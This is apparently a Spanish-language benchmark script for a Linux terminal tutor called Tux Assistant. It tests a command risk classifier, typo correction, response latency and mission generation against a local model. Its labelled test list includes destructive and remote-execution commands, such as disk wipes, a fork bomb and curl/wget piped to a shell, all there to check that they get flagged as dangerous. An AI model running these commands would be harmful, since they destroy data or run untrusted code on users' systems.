"""Validación técnica de Tux Assistant (mediciones reales, reproducibles).

Uso:  ./venv/bin/python validacion/benchmark.py            (todas las pruebas, ~5 min)
      ./venv/bin/python validacion/benchmark.py --solo-reglas (semáforo y errores de escritura)
Genera validacion/resultados.json y validacion/resultados.md
"""
import json
import os
import re
import statistics
import subprocess
import sys
import time

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, RAIZ)
os.chdir(RAIZ)
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import psutil
import requests

import aprendizaje
import riesgo
import terminal
import contexto_sistema
from pedagogia import construir_system_prompt
import main

R = {}

# ---------------------------------------------------------------- E1 semáforo
# Etiquetas definidas por el equipo según el riesgo real del comando (no según las reglas del programa).
SEMAFORO = [
    ("ls -la", "verde"), ("cd ~/Documentos", "verde"), ("cat /etc/os-release", "verde"), ("df -h", "verde"),
    ("free -h", "verde"), ("ps aux | grep firefox", "verde"), ("chmod +x script.sh", "verde"), ("mkdir -p proyectos/web", "verde"),
    ("git status", "verde"), ("ping -c 3 google.com", "verde"), ("tar -xzvf archivo.tar.gz", "verde"), ("ip a", "verde"),
    ("systemctl status bluetooth", "verde"), ("journalctl -xe", "verde"), ("uname -r", "verde"),
    ("sudo apt install vlc", "amarillo"), ("rm -rf build", "amarillo"), ("sudo apt remove firefox", "amarillo"),
    ("chmod 777 archivo.txt", "amarillo"), ("kill -9 1234", "amarillo"), ("sudo systemctl stop ssh", "amarillo"),
    ("echo hola > notas.txt", "amarillo"), ("git reset --hard", "amarillo"), ("sudo reboot", "amarillo"),
    ("find . -name '*.log' -delete", "amarillo"), ("sudo chown -R usuario carpeta", "amarillo"),
    ("sudo pip install requests", "amarillo"), ("sudo usermod -aG docker $USER", "amarillo"),
    ("git push --force", "amarillo"), ("sudo apt autoremove", "amarillo"),
    ("sudo rm -rf /", "rojo"), ("rm -rf ~", "rojo"), ("sudo rm -rf /usr", "rojo"), ("dd if=ubuntu.iso of=/dev/sda", "rojo"),
    ("sudo mkfs.ext4 /dev/sdb1", "rojo"), ("curl -fsSL http://x.sh | sudo bash", "rojo"), ("wget -qO- http://x.sh | sh", "rojo"),
    ("sudo chmod -R 777 /", "rojo"), (":(){ :|:& };:", "rojo"), ("sudo apt purge python3", "rojo"),
    ("echo 0 > /dev/sda", "rojo"), ("sudo rm -rf --no-preserve-root /", "rojo"), ("mv ~/Documentos /dev/null", "rojo"),
    ("sudo fdisk /dev/sda", "rojo"), ("sudo shred -u /dev/sda", "rojo"),
]
aciertos, errores = 0, []
matriz = {e: {p: 0 for p in ("verde", "amarillo", "rojo")} for e in ("verde", "amarillo", "rojo")}
for cmd, esperado in SEMAFORO:
    obtenido = riesgo.analizar(cmd)["nivel"]
    matriz[esperado][obtenido] += 1
    if obtenido == esperado:
        aciertos += 1
    else:
        errores.append({"comando": cmd, "esperado": esperado, "obtenido": obtenido})
peligrosos_no_detectados = sum(1 for c, e in SEMAFORO if e == "rojo" and riesgo.analizar(c)["nivel"] == "verde")
R["semaforo"] = {"n": len(SEMAFORO), "aciertos": aciertos, "exactitud": aciertos / len(SEMAFORO),
                 "rojos_marcados_como_seguros": peligrosos_no_detectados, "matriz": matriz, "fallos": errores}

# ------------------------------------------------------- E2 errores de escritura
TYPOS = [
    ("sudo apd install vlc", 1, "apt"), ("gti status", 127, "git"), ("sl -la", 127, "ls"), ("pyhton3 app.py", 127, "python3"),
    ("sudo apt instal vlc", 100, "install"), ("git psuh", 1, "push"), ("sudo systemctl strat ssh", 1, "start"),
    ("cd..", 127, "cd"), ("mkdri carpeta", 127, "mkdir"), ("nanp notas.txt", 127, "nano"), ("grpe hola a.txt", 127, "grep"),
    ("sudo snap isntall spotify", 1, "install"), ("gut clone x", 127, "git"), ("tpo", 127, "top"), ("sudo apt updte", 100, "update"),
    ("dokcer ps", 127, "docker"), ("git comit -m x", 1, "commit"), ("chmdo +x a.sh", 127, "chmod"), ("cta archivo", 127, "cat"),
    ("sudo apt upgarde", 100, "upgrade"),
]
ok_typo, fallos_typo = 0, []
for cmd, codigo, esperado in TYPOS:
    txt, _ = terminal.explicacion_rapida({"codigo": codigo, "carpeta": "/tmp", "comando": cmd})
    if re.search(r"`" + re.escape(esperado) + r"(\s[^`]*)?`", txt):  # p. ej. `cd ..` cuenta como `cd`
        ok_typo += 1
    else:
        fallos_typo.append({"comando": cmd, "esperado": esperado, "respuesta": txt[:120]})
R["errores_escritura"] = {"n": len(TYPOS), "corregidos": ok_typo, "tasa": ok_typo / len(TYPOS), "fallos": fallos_typo}

if "--solo-reglas" in sys.argv:  # medición rápida de las pruebas que no usan la IA
    print(json.dumps({k: {x: y for x, y in v.items() if x != "matriz"} for k, v in R.items()}, ensure_ascii=False, indent=1))
    sys.exit(0)

# ------------------------------------------------------- E3 respuestas de la IA
modelo = main.elegir_modelo()
R["modelo"] = modelo
PREGUNTAS = [
    ("¿Cuánta RAM estoy usando?", "ram"), ("¿Cuánto espacio libre tengo en el disco?", "disco"),
    ("¿Cómo hago ejecutable un script?", None), ("¿Qué hace el comando chmod 755?", None),
    ("¿Cómo instalo un programa en Ubuntu?", None), ("¿Qué es sudo?", None),
    ("¿Cuántos núcleos tiene mi procesador?", "nucleos"), ("¿Qué significa permission denied?", None),
]


def preguntar(pregunta):
    contexto = contexto_sistema.contexto_completo()
    sistema = construir_system_prompt("principiante", contexto, "usuario")
    vivo = contexto_sistema.datos_en_vivo(pregunta)
    texto = pregunta + ("\n\n[DATOS REALES DE MI EQUIPO, medidos ahora mismo]\n" + vivo if vivo else "")
    cuerpo = {"model": modelo, "messages": [{"role": "system", "content": sistema}, {"role": "user", "content": texto}],
              "stream": True, "keep_alive": "30m", "options": {"num_predict": 350, "num_ctx": 8192, "temperature": 0.3}}
    if modelo.startswith("qwen3"):
        cuerpo["think"] = False
    t0 = time.time(); primero = None; salida = ""
    with requests.post(main.OLLAMA_CHAT_URL, json=cuerpo, stream=True, timeout=180) as r:
        for linea in r.iter_lines():
            if not linea:
                continue
            d = json.loads(linea)
            trozo = d.get("message", {}).get("content", "")
            if trozo and primero is None:
                primero = time.time() - t0
            salida += trozo
            if d.get("done"):
                break
    return primero or 0, time.time() - t0, salida


main.precalentar_modelo()
filas = []
for pregunta, dato in PREGUNTAS:
    ttft, total, resp = preguntar(pregunta)
    fila = {"pregunta": pregunta, "primer_token_s": round(ttft, 2), "total_s": round(total, 2), "caracteres": len(resp),
            "comando_en_acentos": bool(re.search(r"`[^`]+`", resp))}
    if dato:  # ¿el número de la respuesta coincide con el real?
        nums = [float(n.replace(",", ".")) for n in re.findall(r"\d+(?:[.,]\d+)?", resp)]
        if dato == "ram":
            real = psutil.virtual_memory().used / 1024 ** 3
            fila["dato_ok"] = any(abs(n - real) <= max(1.0, real * 0.15) for n in nums)
        elif dato == "disco":
            real = psutil.disk_usage("/").free / 1024 ** 3
            fila["dato_ok"] = any(abs(n - real) <= max(5, real * 0.05) for n in nums)
        elif dato == "nucleos":
            fila["dato_ok"] = os.cpu_count() in [int(n) for n in nums if n == int(n)]
    fila["respuesta"] = resp[:400]
    filas.append(fila)
R["respuestas"] = {
    "n": len(filas), "filas": filas,
    "primer_token_mediana_s": statistics.median(f["primer_token_s"] for f in filas),
    "total_mediana_s": statistics.median(f["total_s"] for f in filas),
    "total_max_s": max(f["total_s"] for f in filas),
    "datos_correctos": sum(1 for f in filas if f.get("dato_ok")), "datos_evaluados": sum(1 for f in filas if "dato_ok" in f),
    "con_comando_formateado": sum(1 for f in filas if f["comando_en_acentos"]),
}

# ------------------------------------------------------- E4 misiones generadas
LECCIONES = ["t1", "t2", "t3", "p2", "p3", "k2", "x1", "d2"]
METAS = ["empezar desde cero", "no repetir errores como `sl -la`", "ser desarrollador"]
mis = []
for i, lid in enumerate(LECCIONES):
    plan = {"meta": METAS[i % len(METAS)]}
    prompt = aprendizaje.prompt_mision(plan, aprendizaje.LECCIONES[lid], [aprendizaje.LECCIONES[lid]["mision"]])
    t0 = time.time()
    cuerpo = {"model": modelo, "messages": [{"role": "user", "content": prompt}], "stream": False, "format": "json",
              "options": {"temperature": 0.5, "num_predict": 450}}
    if modelo.startswith("qwen3"):
        cuerpo["think"] = False
    txt = requests.post(main.OLLAMA_CHAT_URL, json=cuerpo, timeout=120).json().get("message", {}).get("content", "")
    res = aprendizaje.parsear_mision(txt)
    mis.append({"leccion": lid, "meta": plan["meta"], "segundos": round(time.time() - t0, 2), "valida": bool(res),
                "pasos": len(res[1]) if res else 0, "mision": res[0] if res else None})
R["misiones"] = {"n": len(mis), "validas": sum(m["valida"] for m in mis),
                 "pasos_promedio": statistics.mean(m["pasos"] for m in mis if m["valida"]) if any(m["valida"] for m in mis) else 0,
                 "segundos_mediana": statistics.median(m["segundos"] for m in mis), "detalle": mis}

# ------------------------------------------------------- E5 recursos
try:
    vram = subprocess.run(["nvidia-smi", "--query-gpu=memory.used,memory.total,name", "--format=csv,noheader,nounits"],
                          capture_output=True, text=True, timeout=5).stdout.strip()
except OSError:
    vram = ""
tam_modelo = ""
for l in subprocess.run(["ollama", "list"], capture_output=True, text=True).stdout.splitlines():
    if l.startswith(modelo):
        tam_modelo = " ".join(l.split()[2:4])
R["recursos"] = {"gpu": vram, "modelo_disco": tam_modelo,
                 "codigo_kb": round(sum(os.path.getsize(f) for f in os.listdir(".") if f.endswith(".py")) / 1024, 1),
                 "cpu": psutil.cpu_count(), "ram_total_gb": round(psutil.virtual_memory().total / 1024 ** 3, 1)}

json.dump(R, open("validacion/resultados.json", "w"), ensure_ascii=False, indent=2)

# ------------------------------------------------------- resumen en Markdown
s, e, rp, m = R["semaforo"], R["errores_escritura"], R["respuestas"], R["misiones"]
md = [f"# Resultados de la validación técnica\n", f"Modelo: `{modelo}` · Equipo: {R['recursos']['cpu']} hilos, "
      f"{R['recursos']['ram_total_gb']} GB RAM, GPU: {R['recursos']['gpu'] or 'no detectada'}\n",
      "| Prueba | Resultado |", "|---|---|",
      f"| Semáforo de riesgo ({s['n']} comandos) | {s['aciertos']}/{s['n']} ({s['exactitud']:.0%}); peligrosos marcados como seguros: {s['rojos_marcados_como_seguros']} |",
      f"| Corrección de errores de escritura ({e['n']} casos) | {e['corregidos']}/{e['n']} ({e['tasa']:.0%}) |",
      f"| Tiempo al primer texto (mediana, {rp['n']} preguntas) | {rp['primer_token_mediana_s']:.1f} s |",
      f"| Tiempo de respuesta completa (mediana / máximo) | {rp['total_mediana_s']:.1f} s / {rp['total_max_s']:.1f} s |",
      f"| Datos del equipo correctos en la respuesta | {rp['datos_correctos']}/{rp['datos_evaluados']} |",
      f"| Misiones generadas válidas y comprobables | {m['validas']}/{m['n']} (pasos promedio {m['pasos_promedio']:.1f}) |"]
open("validacion/resultados.md", "w").write("\n".join(md) + "\n")
print("\n".join(md))
